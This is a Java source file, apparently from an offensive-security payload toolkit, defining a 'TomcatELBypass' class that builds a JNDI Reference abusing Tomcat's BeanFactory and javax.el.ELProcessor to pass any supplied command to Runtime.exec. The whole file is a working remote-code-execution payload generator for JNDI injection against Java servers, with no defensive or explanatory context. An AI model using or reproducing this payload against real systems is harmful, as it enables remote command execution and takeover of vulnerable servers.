package com.xyuxu.javasec.core.payload.jndi;

import org.apache.naming.ResourceRef;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class TomcatELBypass implements BypassGenerator {

    @Override
    public Reference generate(String command) {
        ResourceRef ref = new ResourceRef(
                "javax.el.ELProcessor",
                null, "", "", true, "org.apache.naming.factory.BeanFactory", null);

        ref.add(new StringRefAddr("forceString", "x=eval"));
        String payload = "\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"" + command + "\")";

        ref.add(new StringRefAddr("x", payload));
        return ref;
    }


}